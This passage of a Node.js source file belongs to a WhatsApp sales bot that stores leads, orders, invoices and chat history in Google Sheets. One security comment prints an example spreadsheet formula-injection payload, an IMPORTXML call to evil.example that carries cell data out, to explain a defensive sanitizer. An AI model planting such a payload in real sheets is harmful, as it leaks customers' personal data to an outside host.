    sheetsClient.spreadsheets.values.get({ spreadsheetId: config.googleSheetId, range }, { timeout: REQUEST_TIMEOUT_MS })
  );
  const values = result.data.values || [];
  return values.map((row, i) => ({
    rowNumber: i + 2,
    phoneNumber: row[0] || '',
    chatId: row[1] || '',
    customerName: row[2] || '',
    category: row[3] || '',
    campaignStatus: row[4] || '',
    leadSource: row[5] || '',
    recencyTier: row[6] || '',
    touches: parseInt(row[7], 10) || 0,
    objectionReason: row[8] || '',
    optOut: (row[9] || '').toUpperCase() === 'TRUE',
    lastMessageDate: row[10] || '',
    sentAt: row[11] || '',
    repliedAt: row[12] || '',
    orderedAt: row[13] || '',
    offerSent: row[14] || '',
    botPaused: (row[15] || '').toUpperCase() === 'TRUE',
    sendNow: (row[16] || '').toUpperCase() === 'TRUE',
    blocked: (row[17] || '').toUpperCase() === 'TRUE',
  }));
}

// Upserts by Chat ID (column B) — inserts a new row if the chatId isn't
// present yet, otherwise patches only the given fields on the existing row.
async function upsertTargetedClient(chatId, fields) {
  if (!enabled) return;
  const rows = await getTargetedClientsRows();
  const existing = rows.find((r) => r.chatId === chatId);

  const merged = {
    phoneNumber: '',
    chatId,
    customerName: '',
    category: '',
    campaignStatus: 'ON_HOLD',
    leadSource: '',
    recencyTier: '',
    touches: 0,
    objectionReason: '',
    optOut: false,
    lastMessageDate: '',
    sentAt: '',
    repliedAt: '',
    orderedAt: '',
    offerSent: '',
    botPaused: false,
    sendNow: false,
    blocked: false,
    ...(existing || {}),
    ...fields,
  };
  const values = [
    sanitizeForSheetCell(merged.phoneNumber),
    sanitizeForSheetCell(merged.chatId),
    sanitizeForSheetCell(merged.customerName),
    sanitizeForSheetCell(merged.category),
    sanitizeForSheetCell(merged.campaignStatus),
    sanitizeForSheetCell(merged.leadSource),
    sanitizeForSheetCell(merged.recencyTier),
    merged.touches,
    sanitizeForSheetCell(merged.objectionReason),
    merged.optOut ? 'TRUE' : 'FALSE',
    sanitizeForSheetCell(merged.lastMessageDate),
    sanitizeForSheetCell(merged.sentAt),
    sanitizeForSheetCell(merged.repliedAt),
    sanitizeForSheetCell(merged.orderedAt),
    sanitizeForSheetCell(merged.offerSent),
    merged.botPaused ? 'TRUE' : 'FALSE',
    merged.sendNow ? 'TRUE' : 'FALSE',
    merged.blocked ? 'TRUE' : 'FALSE',
  ];

  if (existing) {
    await sheetsCall(() =>
      sheetsClient.spreadsheets.values.update(
        {
          spreadsheetId: config.googleSheetId,
          range: `${TARGETED_CLIENTS_SHEET_NAME}!A${existing.rowNumber}:${columnLetter(TARGETED_CLIENTS_HEADERS.length)}${existing.rowNumber}`,
          valueInputOption: 'USER_ENTERED',
          requestBody: { values: [values] },
        },
        { timeout: REQUEST_TIMEOUT_MS }
      )
    );
  } else {
    await sheetsCall(() =>
      sheetsClient.spreadsheets.values.append(
        {
          spreadsheetId: config.googleSheetId,
          range: `${TARGETED_CLIENTS_SHEET_NAME}!A:${columnLetter(TARGETED_CLIENTS_HEADERS.length)}`,
          valueInputOption: 'USER_ENTERED',
          insertDataOption: 'INSERT_ROWS',
          requestBody: { values: [values] },
        },
        { timeout: REQUEST_TIMEOUT_MS }
      )
    );
  }
}

// One-time visual polish (2026-07-30) — dropdowns + color-coded conditional
// formatting so CAMPAIGN_STATUS/TEST_TRIGGER read as an obvious control panel
// at a glance, not a plain data grid. Preserves whatever the owner has
// already typed into CAMPAIGN_STATUS (B1) and OFFER_TEXT (B2) — only
// refreshes labels/notes/styling and normalizes a still-blank TEST_TRIGGER
// to 'IDLE'. Not called automatically on startup (purely cosmetic, no need
// to redo it every restart) — run manually when re-styling is wanted.
async function formatOffersCampaignTable() {
  if (!enabled) return;
  const meta = await sheetsClient.spreadsheets.get({ spreadsheetId: config.googleSheetId }, { timeout: REQUEST_TIMEOUT_MS });
  const sheetMeta = (meta.data.sheets || []).find((s) => s.properties.title === OFFERS_CAMPAIGN_SHEET_NAME);
  if (!sheetMeta) throw new Error(`"${OFFERS_CAMPAIGN_SHEET_NAME}" tab not found — run ensureCrmTabs() first.`);
  const sheetId = sheetMeta.properties.sheetId;
  const lastDataRow = OFFERS_CAMPAIGN_OFFER_COUNT + 1; // header + 5 offers = row 6

  // Normalize CAMPAIGN_STATUS/TEST_TRIGGER to the dropdowns' valid values
  // before the strict dropdown validation below is applied, same reasoning
  // as the old single-panel version: a blank cell would otherwise show as an
  // "invalid value" warning the very first time this runs.
  const offers = await getOffersCampaignRows();
  const normalized = offers.map((o) => [
    o.offerId,
    o.offerName,
    o.offerText,
    o.campaignStatus === 'PUSH' ? 'PUSH' : 'PAUSE',
    o.testTrigger === 'SEND' ? 'SEND' : 'IDLE',
    o.lastTestSentAt,
    o.productId,
  ]);
  await sheetsClient.spreadsheets.values.update(
    {
      spreadsheetId: config.googleSheetId,
      range: `${OFFERS_CAMPAIGN_SHEET_NAME}!A2:G${lastDataRow}`,
      valueInputOption: 'RAW',
      requestBody: { values: normalized },
    },
    { timeout: REQUEST_TIMEOUT_MS }
  );

  const statusColRange = { sheetId, startRowIndex: 1, endRowIndex: lastDataRow, startColumnIndex: 3, endColumnIndex: 4 }; // D2:D6
  const testTriggerColRange = { sheetId, startRowIndex: 1, endRowIndex: lastDataRow, startColumnIndex: 4, endColumnIndex: 5 }; // E2:E6
  const offerTextColRange = { sheetId, startRowIndex: 1, endRowIndex: lastDataRow, startColumnIndex: 2, endColumnIndex: 3 }; // C2:C6

  const dropdown = (range, values) => ({
    setDataValidation: {
      range,
      rule: { condition: { type: 'ONE_OF_LIST', values: values.map((v) => ({ userEnteredValue: v })) }, showCustomUi: true, strict: true },
    },
  });
  const colorRule = (range, textValue, bg, index) => ({
    addConditionalFormatRule: {
      rule: {
        ranges: [range],
        booleanRule: {
          condition: { type: 'TEXT_EQ', values: [{ userEnteredValue: textValue }] },
          format: { backgroundColor: bg, textFormat: { foregroundColor: { red: 1, green: 1, blue: 1 }, bold: true } },
        },
      },
      index,
    },
  });

  const green = { red: 0.2, green: 0.66, blue: 0.33 };
  const gray = { red: 0.55, green: 0.55, blue: 0.55 };

  const requests = [
    ...dataTableStyleRequests(sheetId, OFFERS_CAMPAIGN_HEADERS.length),
    { updateDimensionProperties: { range: { sheetId, dimension: 'COLUMNS', startIndex: 0, endIndex: 1 }, properties: { pixelSize: 90 }, fields: 'pixelSize' } },
    { updateDimensionProperties: { range: { sheetId, dimension: 'COLUMNS', startIndex: 1, endIndex: 2 }, properties: { pixelSize: 140 }, fields: 'pixelSize' } },
    { updateDimensionProperties: { range: { sheetId, dimension: 'COLUMNS', startIndex: 2, endIndex: 3 }, properties: { pixelSize: 480 }, fields: 'pixelSize' } },
    { updateDimensionProperties: { range: { sheetId, dimension: 'COLUMNS', startIndex: 6, endIndex: 7 }, properties: { pixelSize: 140 }, fields: 'pixelSize' } }, // G: Product ID
    { updateDimensionProperties: { range: { sheetId, dimension: 'COLUMNS', startIndex: 8, endIndex: 9 }, properties: { pixelSize: 220 }, fields: 'pixelSize' } }, // I: heartbeat panel
    {
      repeatCell: {
        range: offerTextColRange,
        cell: { userEnteredFormat: { wrapStrategy: 'WRAP', verticalAlignment: 'TOP' } },
        fields: 'userEnteredFormat(wrapStrategy,verticalAlignment)',
      },
    },
    // Heartbeat side panel (I1 label / I2 value, column H left blank as a
    // visual gap) — small italic note so it reads as an intentional
    // worker-health readout, not stray data.
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 0, endRowIndex: 1, startColumnIndex: 8, endColumnIndex: 9 },
        cell: { userEnteredFormat: { textFormat: { italic: true, bold: true, fontSize: 9, foregroundColor: { red: 0.4, green: 0.4, blue: 0.4 } } } },
        fields: 'userEnteredFormat(textFormat)',
      },
    },
    dropdown(statusColRange, ['PAUSE', 'PUSH']),
    dropdown(testTriggerColRange, ['SEND', 'IDLE']),
    colorRule(statusColRange, 'PUSH', green, 0),
    colorRule(statusColRange, 'PAUSE', gray, 1),
    colorRule(testTriggerColRange, 'SEND', green, 2),
    colorRule(testTriggerColRange, 'IDLE', gray, 3),
  ];

  await sheetsClient.spreadsheets.batchUpdate(
    { spreadsheetId: config.googleSheetId, requestBody: { requests } },
    { timeout: REQUEST_TIMEOUT_MS }
  );
  logger.success(`Formatted "${OFFERS_CAMPAIGN_SHEET_NAME}" as a ${OFFERS_CAMPAIGN_OFFER_COUNT}-offer table (dropdowns + color coding applied).`);
}

const CAMPAIGN_STATUS_COLORS = [
  ['ON_HOLD', { red: 0.55, green: 0.55, blue: 0.55 }],
  ['PENDING', { red: 0.95, green: 0.61, blue: 0.07 }],
  ['OFFER_SENT', { red: 0.26, green: 0.52, blue: 0.96 }],
  ['REPLIED', { red: 0.3, green: 0.69, blue: 0.31 }],
  ['ORDERED', { red: 0.08, green: 0.34, blue: 0.13 }],
  ['DECLINED', { red: 0.83, green: 0.18, blue: 0.18 }],
  // 2026-08-02 audit fix: campaignWorker.js's classifyLeadForCampaign()
  // auto-reclassifies a PENDING row into this status when its objectionReason
  // is flagged for specialist/non-sales follow-up — never auto-messaged,
  // needs a human to actually reach out. Distinct purple so it stands out
  // from the campaign-flow statuses above.
  ['NEEDS_HUMAN_REVIEW', { red: 0.5, green: 0.2, blue: 0.6 }],
];

// Pure formatting — never touches cell content (unlike
// formatOffersCampaignPanel, which also refreshes labels/notes). Safe to
// re-run anytime without risk to the 34 already-seeded leads or any status
// changes the owner has made since.
async function formatTargetedClientsTab() {
  if (!enabled) return;
  const meta = await sheetsClient.spreadsheets.get({ spreadsheetId: config.googleSheetId }, { timeout: REQUEST_TIMEOUT_MS });
  const sheetMeta = (meta.data.sheets || []).find((s) => s.properties.title === TARGETED_CLIENTS_SHEET_NAME);
  if (!sheetMeta) throw new Error(`"${TARGETED_CLIENTS_SHEET_NAME}" tab not found — run ensureCrmTabs() first.`);
  const sheetId = sheetMeta.properties.sheetId;
  const columnCount = TARGETED_CLIENTS_HEADERS.length;
  const statusColIndex = TARGETED_CLIENTS_HEADERS.indexOf('Campaign Status');
  const statusRange = { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: statusColIndex, endColumnIndex: statusColIndex + 1 };
  const phoneColIndex = TARGETED_CLIENTS_HEADERS.indexOf('Phone Number');
  const touchesColIndex = TARGETED_CLIENTS_HEADERS.indexOf('Campaign Touches');
  const timestampStartIndex = TARGETED_CLIENTS_HEADERS.indexOf('Last Message Date');
  // Timestamp formatting must stop after "Offer Sent" — the two new
  // TRUE/FALSE flag columns after it (2026-08-03) are not timestamps and
  // must not get DATE_TIME number formatting applied.
  const timestampEndIndex = TARGETED_CLIENTS_HEADERS.indexOf('Offer Sent') + 1;

  const requests = [
    ...dataTableStyleRequests(sheetId, columnCount),
    {
      setDataValidation: {
        range: statusRange,
        rule: {
          condition: { type: 'ONE_OF_LIST', values: CAMPAIGN_STATUS_COLORS.map(([v]) => ({ userEnteredValue: v })) },
          showCustomUi: true,
          strict: true,
        },
      },
    },
    ...CAMPAIGN_STATUS_COLORS.map(([value, color], index) => ({
      addConditionalFormatRule: {
        rule: {
          ranges: [statusRange],
          booleanRule: {
            condition: { type: 'TEXT_EQ', values: [{ userEnteredValue: value }] },
            format: { backgroundColor: color, textFormat: { foregroundColor: { red: 1, green: 1, blue: 1 }, bold: true } },
          },
        },
        index,
      },
    })),
    // Phone as plain text (never mangled by Sheets' own number formatting), centered.
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: phoneColIndex, endColumnIndex: phoneColIndex + 1 },
        cell: { userEnteredFormat: { numberFormat: { type: 'TEXT' }, horizontalAlignment: 'CENTER' } },
        fields: 'userEnteredFormat(numberFormat,horizontalAlignment)',
      },
    },
    // Campaign Touches — numeric, centered.
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: touchesColIndex, endColumnIndex: touchesColIndex + 1 },
        cell: { userEnteredFormat: { horizontalAlignment: 'CENTER' } },
        fields: 'userEnteredFormat(horizontalAlignment)',
      },
    },
    // Last Message Date / Sent At / Replied At / Ordered At — centered; a
    // DATE_TIME numberFormat has no visible effect on the ISO-string text
    // currently stored there, but takes effect automatically if these ever
    // get written as real date values instead.
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: timestampStartIndex, endColumnIndex: timestampEndIndex },
        cell: { userEnteredFormat: { horizontalAlignment: 'CENTER', numberFormat: { type: 'DATE_TIME', pattern: 'yyyy-mm-dd hh:mm' } } },
        fields: 'userEnteredFormat(horizontalAlignment,numberFormat)',
      },
    },
    // Bot Paused / Send Now — centered, plain TRUE/FALSE text (same
    // convention as Opt-Out, no special number format needed).
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: timestampEndIndex, endColumnIndex: columnCount },
        cell: { userEnteredFormat: { horizontalAlignment: 'CENTER' } },
        fields: 'userEnteredFormat(horizontalAlignment)',
      },
    },
  ];

  await sheetsClient.spreadsheets.batchUpdate(
    { spreadsheetId: config.googleSheetId, requestBody: { requests } },
    { timeout: REQUEST_TIMEOUT_MS }
  );
  logger.success(`Formatted "${TARGETED_CLIENTS_SHEET_NAME}" (status dropdown + color coding, dark header, banding, auto-fit columns).`);
}

async function formatConfirmedOrdersTab() {
  if (!enabled) return;
  const meta = await sheetsClient.spreadsheets.get({ spreadsheetId: config.googleSheetId }, { timeout: REQUEST_TIMEOUT_MS });
  const sheetMeta = (meta.data.sheets || []).find((s) => s.properties.title === CONFIRMED_ORDERS_SHEET_NAME);
  if (!sheetMeta) throw new Error(`"${CONFIRMED_ORDERS_SHEET_NAME}" tab not found — run ensureCrmTabs() first.`);
  const sheetId = sheetMeta.properties.sheetId;
  const columnCount = CONFIRMED_ORDERS_HEADERS.length;
  const dateColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Date');
  const phoneColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Phone');
  const priceColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Total Price');
  const invoiceColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Invoice Link');
  const printColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Print Invoice');

  const requests = [
    ...dataTableStyleRequests(sheetId, columnCount),
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: dateColIndex, endColumnIndex: dateColIndex + 1 },
        cell: { userEnteredFormat: { horizontalAlignment: 'CENTER', numberFormat: { type: 'DATE_TIME', pattern: 'yyyy-mm-dd hh:mm' } } },
        fields: 'userEnteredFormat(horizontalAlignment,numberFormat)',
      },
    },
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: phoneColIndex, endColumnIndex: phoneColIndex + 1 },
        cell: { userEnteredFormat: { numberFormat: { type: 'TEXT' }, horizontalAlignment: 'CENTER' } },
        fields: 'userEnteredFormat(numberFormat,horizontalAlignment)',
      },
    },
    // Total Price — real numbers (appendConfirmedOrder writes them via
    // USER_ENTERED, which parses a plain numeric string into an actual
    // number), so a currency pattern renders correctly, not just cosmetically.
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: priceColIndex, endColumnIndex: priceColIndex + 1 },
        cell: {
          userEnteredFormat: {
            numberFormat: { type: 'CURRENCY', pattern: '#,##0" ج.م"' },
            horizontalAlignment: 'RIGHT',
            textFormat: { bold: true },
          },
        },
        fields: 'userEnteredFormat(numberFormat,horizontalAlignment,textFormat)',
      },
    },
    // Invoice Link / Print Invoice — HYPERLINK-formula cells (see
    // attachInvoiceLinks), styled to read as clickable actions rather than
    // plain data.
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: invoiceColIndex, endColumnIndex: printColIndex + 1 },
        cell: {
          userEnteredFormat: {
            horizontalAlignment: 'CENTER',
            textFormat: { bold: true, foregroundColor: { red: 0.06, green: 0.36, blue: 0.66 } },
          },
        },
        fields: 'userEnteredFormat(horizontalAlignment,textFormat)',
      },
    },
  ];

  await sheetsClient.spreadsheets.batchUpdate(
    { spreadsheetId: config.googleSheetId, requestBody: { requests } },
    { timeout: REQUEST_TIMEOUT_MS }
  );
  logger.success(`Formatted "${CONFIRMED_ORDERS_SHEET_NAME}" (dark header, banding, auto-fit columns, currency formatting).`);
}

// Returns { rowNumber } (or null if disabled) so a caller can later attach
// invoice links to this exact row via attachInvoiceLinks — Invoice Link/
// Print Invoice (columns G:H) are deliberately not written here, since that
// happens afterward and must never block or risk this row itself (see
// invoiceService.js).
async function appendConfirmedOrder({ customerName, phone, address, products, totalPrice }) {
  if (!enabled) return null;

  // Explicit idempotency check — see ORDER_DEDUP_WINDOW_MS above. No
  // in-memory cache exists for this tab (append-only, low volume, no other
  // reader needs one), so this reads the current rows directly; cheap given
  // how rarely a real order actually confirms.
  if (phone) {
    const existing = await sheetsCall(() =>
      sheetsClient.spreadsheets.values.get(
        { spreadsheetId: config.googleSheetId, range: `${CONFIRMED_ORDERS_SHEET_NAME}!A:F` },
        { timeout: REQUEST_TIMEOUT_MS }
      )
    );
    const nowTs = Date.now();
    const rows = (existing.data.values || []).slice(1);
    const duplicate = rows.find((row) => {
      const [rowDate, , rowPhone, , rowProducts, rowTotal] = row;
      if (rowPhone !== phone) return false;
      if ((rowProducts || '') !== (products || '')) return false;
      if (String(rowTotal || '') !== String(totalPrice != null ? totalPrice : '')) return false;
      const ts = new Date(rowDate).getTime();
      return !Number.isNaN(ts) && Math.abs(nowTs - ts) < ORDER_DEDUP_WINDOW_MS;
    });
    if (duplicate) {
      logger.warn(`Skipped duplicate Confirmed_Orders log for ${phone} (${products || 'unknown'}) — an identical order was already logged at ${duplicate[0]}.`);
      return null;
    }
  }

  const row = sanitizeRowForSheet([
    new Date().toISOString(),
    customerName || '',
    phone || '',
    address || '',
    products || '',
    totalPrice != null ? String(totalPrice) : '',
  ]);
  const result = await sheetsCall(() =>
    sheetsClient.spreadsheets.values.append(
      {
        spreadsheetId: config.googleSheetId,
        range: `${CONFIRMED_ORDERS_SHEET_NAME}!A:F`,
        valueInputOption: 'USER_ENTERED',
        insertDataOption: 'INSERT_ROWS',
        requestBody: { values: [row] },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
  const rowNumber = extractRowNumber(result.data.updates && result.data.updates.updatedRange);
  return { rowNumber };
}

// Writes clickable HYPERLINK formulas into an already-existing Confirmed_Orders
// row's Invoice Link/Print Invoice columns. Both point at the same local
// GET /invoice/:rowNumber URL (src/index.js) — the invoice is rendered
// on-the-fly and printed straight from the browser (Ctrl+P), so there's
// nothing else to link to (no Drive/PDF file, no separate "print" variant).
async function attachInvoiceLinks(rowNumber, url) {
  if (!enabled || !rowNumber || !url) return;
  const invoiceColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Invoice Link');
  const printColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Print Invoice');
  const startCol = columnLetter(invoiceColIndex + 1);
  const endCol = columnLetter(printColIndex + 1);
  await sheetsCall(() =>
    sheetsClient.spreadsheets.values.update(
      {
        spreadsheetId: config.googleSheetId,
        range: `${CONFIRMED_ORDERS_SHEET_NAME}!${startCol}${rowNumber}:${endCol}${rowNumber}`,
        valueInputOption: 'USER_ENTERED',
        requestBody: { values: [[`=HYPERLINK("${url}","🧾 عرض الفاتورة")`, `=HYPERLINK("${url}","🖨️ طباعة")`]] },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
}

// Reads a single Confirmed_Orders row on demand — backs GET /invoice/:rowNumber
// (src/index.js), which renders the invoice fresh on every request rather
// than caching or storing it anywhere.
async function getConfirmedOrderByRow(rowNumber) {
  if (!enabled || !rowNumber) return null;
  const result = await sheetsCall(() =>
    sheetsClient.spreadsheets.values.get(
      {
        spreadsheetId: config.googleSheetId,
        range: `${CONFIRMED_ORDERS_SHEET_NAME}!A${rowNumber}:F${rowNumber}`,
      },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
  const [date, customerName, phone, address, products, totalPrice] = (result.data.values && result.data.values[0]) || [];
  if (!date) return null;
  return { date, customerName, phone, address, products, totalPrice };
}

// phone number lives in column C (index 2) of the Leads sheet; earliest row
// wins for a given phone so pre-existing historical duplicates (rows written
// before this upsert logic existed) consolidate onto their first row rather
// than the cache flip-flopping between them.
async function loadPhoneRowCache() {
  if (!enabled) return;
  try {
    const result = await sheetsClient.spreadsheets.values.get(
      { spreadsheetId: config.googleSheetId, range: `${LEADS_SHEET_NAME}!A2:C` },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    const rows = result.data.values || [];
    const cache = new Map();
    rows.forEach((row, i) => {
      const phone = row[2];
      if (phone && !cache.has(phone)) cache.set(phone, i + 2); // +2: 1-based, past the header row
    });
    phoneRowCache = cache;
    logger.info(`Loaded ${phoneRowCache.size} existing lead row(s) from the Leads sheet for phone-number dedup.`);
  } catch (err) {
    logger.error('Could not load existing Leads rows for phone-number dedup. Leads will still be logged, just as new rows until the next successful load.', err);
  }
}

// Reads the current Order Status (column H) for every Leads row — the one
// read path in this file that goes the OTHER direction: detecting a
// STAFF-made edit in the sheet rather than something the bot itself wrote.
// Powers deliveryFollowup.js's polling for rows manually switched to
// "Delivered". Returns [{ row, phone, orderStatus }, ...].
async function scanLeadsStatuses() {
  if (!enabled) return [];
  try {
    const result = await sheetsClient.spreadsheets.values.get(
      { spreadsheetId: config.googleSheetId, range: `${LEADS_SHEET_NAME}!C2:H` },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    const rows = result.data.values || [];
    return rows
      .map((row, i) => ({ row: i + 2, phone: row[0], orderStatus: row[5] || '' }))
      .filter((r) => r.phone);
  } catch (err) {
    logger.error('Could not scan Leads Order Status column.', err);
    return [];
  }
}

// Targeted single-cell write (Order Status only, column H) via the existing
// phone -> row cache — used when the BOT itself determines a status change
// (e.g. a customer confirming or disputing delivery), as opposed to
// appendLead's full-row upsert. Never touches any other column.
async function updateOrderStatus(phone, newStatus) {
  if (!enabled) {
    logger.warn('Google Sheets is not configured. Skipping Order Status update (WhatsApp bot continues normally).');
    return false;
  }
  const row = phoneRowCache.get(phone);
  if (!row) {
    logger.warn(`No Leads row found for ${phone} — cannot update Order Status to "${newStatus}".`);
    return false;
  }
  try {
    await sheetsClient.spreadsheets.values.update(
      {
        spreadsheetId: config.googleSheetId,
        range: `${LEADS_SHEET_NAME}!H${row}`,
        valueInputOption: 'USER_ENTERED',
        requestBody: { values: [[newStatus]] },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    logger.success(`Order Status updated to "${newStatus}" for ${phone} (row ${row}).`);
    return true;
  } catch (err) {
    logger.error(`Failed to update Order Status for ${phone}.`, err);
    return false;
  }
}

// Live, targeted read (Product Name..Order Status, columns E-H) for a single
// phone's Leads row — powers the "فين طلبي؟" customer-facing status lookup
// (llmAgent.js). Deliberately a fresh API call rather than a cached read:
// Order Status can change from a STAFF edit directly in the Sheet UI (e.g.
// manually marking a row "Delivered" — see deliveryFollowup.js), which never
// flows back into the bot's own in-memory session state, so only a live read
// is guaranteed current. Returns null if there's no row for this phone yet
// (brand-new customer, never logged) or Sheets is unavailable — the caller
// treats both the same way ("no order on file").
async function getCurrentOrderStatus(phone) {
  if (!enabled) return null;
  const row = phoneRowCache.get(phone);
  if (!row) return null;
  try {
    const result = await sheetsClient.spreadsheets.values.get(
      { spreadsheetId: config.googleSheetId, range: `${LEADS_SHEET_NAME}!E${row}:H${row}` },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    const values = (result.data.values && result.data.values[0]) || [];
    return {
      productName: values[0] || '',
      deliveryAddress: values[2] || '',
      orderStatus: values[3] || '',
    };
  } catch (err) {
    logger.error(`Failed to read live order status for ${phone}.`, err);
    return null;
  }
}

// Builds phone -> [{date, timestamp, productName, price}, ...] (most-recent
// first) from every row in Order History. Unlike loadPhoneRowCache, this
// keeps every row per phone (not just one), since the whole point is a full
// purchase history, not a single current-state row.
async function loadCustomerHistoryCache() {
  if (!enabled) return;
  try {
    const result = await sheetsClient.spreadsheets.values.get(
      { spreadsheetId: config.googleSheetId, range: `${ORDER_HISTORY_SHEET_NAME}!A2:F` },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    const rows = result.data.values || [];
    const cache = new Map();
    rows.forEach((row) => {
      const [date, , phone, productName, price] = row;
      if (!phone || !date) return;
      const timestamp = new Date(date).getTime();
      if (Number.isNaN(timestamp)) return;
      const entry = { date, timestamp, productName: productName || '', price: price || '' };
      const existing = cache.get(phone) || [];
      existing.push(entry);
      cache.set(phone, existing);
    });
    cache.forEach((entries) => entries.sort((a, b) => b.timestamp - a.timestamp));
    customerHistoryCache = cache;
    logger.info(`Loaded order history for ${customerHistoryCache.size} customer(s) from the Order History sheet.`);
  } catch (err) {
    logger.error('Could not load Order History for customer-memory lookups. Returning customers will not be recognized until the next successful load.', err);
  }
}

// Appends one row per completed order (never upserted) and updates the
// in-memory cache immediately, so the very next message from this customer
// — even seconds later — already reflects it without another Sheets read.
async function logOrderHistory(entry) {
  if (!enabled) {
    logger.warn('Google Sheets is not configured. Skipping order-history log (WhatsApp bot continues normally).');
    return false;
  }
  const date = entry.date || new Date().toISOString();
  const phone = entry.phone;

  // Explicit idempotency check — see ORDER_DEDUP_WINDOW_MS above.
  if (phone) {
    const nowTs = new Date(date).getTime();
    const recent = customerHistoryCache.get(phone) || [];
    const duplicate = recent.find(
      (o) =>
        o.productName === (entry.productName || '') &&
        String(o.price) === String(entry.price || '') &&
        Math.abs(nowTs - o.timestamp) < ORDER_DEDUP_WINDOW_MS
    );
    if (duplicate) {
      logger.warn(
        `Skipped duplicate Order History log for ${phone} (${entry.productName || 'unknown'}) — an identical order was already logged at ${duplicate.date}.`
      );
      return false;
    }
  }

  try {
    await sheetsClient.spreadsheets.values.append(
      {
        spreadsheetId: config.googleSheetId,
        range: `${ORDER_HISTORY_SHEET_NAME}!A:F`,
        valueInputOption: 'USER_ENTERED',
        insertDataOption: 'INSERT_ROWS',
        // See sanitizeRowForSheet's doc comment (near extractRowNumber) —
        // entry.customerName here is the same customer-controlled field as
        // appendLead's, so it needs the same formula-injection guard.
        requestBody: {
          values: [sanitizeRowForSheet([date, entry.customerName || '', phone || '', entry.productName || '', entry.price || '', entry.orderStatus || 'Completed'])],
        },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    if (phone) {
      const timestamp = new Date(date).getTime();
      const existing = customerHistoryCache.get(phone) || [];
      existing.unshift({ date, timestamp, productName: entry.productName || '', price: entry.price || '' });
      existing.sort((a, b) => b.timestamp - a.timestamp);
      customerHistoryCache.set(phone, existing);
    }
    logger.success(`Order history logged for ${phone} (product: ${entry.productName || 'unknown'}).`);
    return true;
  } catch (err) {
    logger.error('Failed to log order history. WhatsApp bot continues normally.', err);
    return false;
  }
}

// Pure in-memory lookup — safe to call on every message. Returns [] for a
// brand-new customer or if Sheets is disabled/hasn't loaded yet.
function getCustomerHistory(phone) {
  return customerHistoryCache.get(phone) || [];
}

// Parses a row number out of a values.append `updatedRange` like
// "Leads!A35:J35" (or the single-cell form "Leads!A35").
function extractRowNumber(updatedRange) {
  const match = /![A-Z]+(\d+)/.exec(updatedRange || '');
  return match ? parseInt(match[1], 10) : null;
}

// SECURITY (2026-07-18): rows are written with valueInputOption:'USER_ENTERED'
// (needed so the bot's own Date column and the staff-owned Follow-up Date
// round-trip stay real Sheets date values, not inert text) — but that mode
// also means a cell value starting with =, +, - or @ gets evaluated as a
// formula by Sheets/Excel. Several fields in a logged row are entirely
// customer-controlled (customerName is the WhatsApp display name — trivial
// for anyone to set to anything; deliveryAddress/notes routinely echo raw
// customer-typed text). Without this, a customer could set their WhatsApp
// name to something like =IMPORTXML("https://evil.example/x?"&A1&C1,"//a")
// and have it silently execute the moment a staff member opens the sheet —
// exfiltrating other customers' data or serving a phishing link. Prefixing a
// leading apostrophe is the standard CSV/formula-injection mitigation: it
// forces Sheets to store the value as literal text, exactly like typing '=
// directly into a cell in the Sheets UI does.
const FORMULA_TRIGGER_CHARS = new Set(['=', '+', '-', '@']);

function sanitizeForSheetCell(value) {
  if (typeof value !== 'string' || value.length === 0) return value;
  return FORMULA_TRIGGER_CHARS.has(value[0]) ? `'${value}` : value;
}

function sanitizeRowForSheet(row) {
  return row.map(sanitizeForSheetCell);
}

// 2026-07-18: the Conversation History note now holds a clean JSON array of
// {role, content} chat turns — the exact OpenAI fine-tuning message shape —
// instead of a human-readable "[timestamp] العميل: ..." text block, so the
// 2-month dataset this is building up can be exported and used for local-LLM
// fine-tuning with no manual cleanup. buildHistoryEntries turns one turn of
// a logged message into 0-2 of those {role, content} objects.
function buildHistoryEntries(entry) {
  const turns = [];
  if (entry.customerMessage) turns.push({ role: 'user', content: entry.customerMessage });
  if (entry.replyText) turns.push({ role: 'assistant', content: entry.replyText });
  return turns;
}

// Rows written before 2026-07-18 have a note in the old free-text format
// ("[timestamp] العميل: ..." / "[timestamp] سارة: ..." lines) rather than
// JSON. Parsed once, on first read, into the same {role, content} shape so
// existing customers' history carries forward into the new column format
// instead of being silently dropped the next time they message.
function parseLegacyHistoryText(text) {
  return text
    .split('\n')
    .map((line) => {
      const match = /^\[.*?\]\s(العميل|سارة):\s(.*)$/.exec(line);
      if (!match) return null;
      return { role: match[1] === 'العميل' ? 'user' : 'assistant', content: match[2] };
    })
    .filter(Boolean);
}

// Existing note (previousHistory from getExistingRowState) is either JSON
